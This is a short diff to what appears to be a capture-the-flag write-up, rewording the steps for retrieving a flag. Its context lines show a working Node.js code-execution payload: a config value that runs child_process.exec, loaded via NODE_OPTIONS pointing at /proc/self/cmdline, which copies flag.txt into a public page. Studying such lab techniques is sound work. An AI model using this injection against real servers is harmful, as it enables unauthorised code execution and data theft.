@@ -135,7 +135,10 @@ title = "userData"
 argv0 = "require('child_process').exec('cat ./flag.txt > ./public/pages/empty.html', {shell: '/bin/bash'},(error, stdout, stderr) => {if (error) {console.error('RCE');return;}})//"
 NODE_OPTIONS = "--require /proc/self/cmdline"
 ```
-This allows me to modify the content of empty.html to the content of the flag, and then I can retrieve the flag by visiting `/empty`.
+This allows RCE to modify the content of empty.html to the content of the flag
+
+- Wait for the server to restart
+- Retrieve the flag by visiting `/empty`.
 
 ### How the .patch file works
 
